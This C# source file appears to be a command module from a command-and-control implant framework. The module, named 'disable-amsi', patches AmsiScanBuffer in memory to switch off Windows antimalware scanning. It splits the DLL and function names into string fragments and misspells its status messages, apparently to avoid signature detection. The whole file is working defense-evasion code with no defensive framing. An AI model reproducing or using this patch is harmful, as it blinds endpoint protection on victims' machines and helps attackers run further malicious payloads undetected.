using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;
namespace Agent.Commands
{
    public class DisableAMSI : AgentCommand
    {
        public override string Name => "disable-amsi";

        public override string Execute(AgentTask task)
        {
            //untested
            byte[] patch;
            patch = new byte[6] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            try
            {
                string libName = "a" + "msi" + ".dll";
                string funcName = "Am" + "siSca" + "nBu" + "ff" + "er";
                var lib = Native.Kernel32.LoadLibrary(libName);
                var addr = Native.Kernel32.GetProcAddress(lib, funcName);
                if (addr == null)
                {
                    return "ay em si eye not loadeded into memory exiting...";
                }
                uint oldProtect;
                if (!Native.Kernel32.VirtualProtect(addr, patch.Length, 0x40, out oldProtect))
                {
                    return "Failed to change memory protection -> ";

                }
                Marshal.Copy(patch, 0, addr, patch.Length);
                if (!Native.Kernel32.VirtualProtect(addr, patch.Length, oldProtect, out oldProtect))
                {
                    return "Failed to revert memory protection";
                }
                return "Successfully Disable ay msi";
            }
            catch (Exception e)
            {
               return $"Exception:  {e.Message}";

            }
        }
    }
}
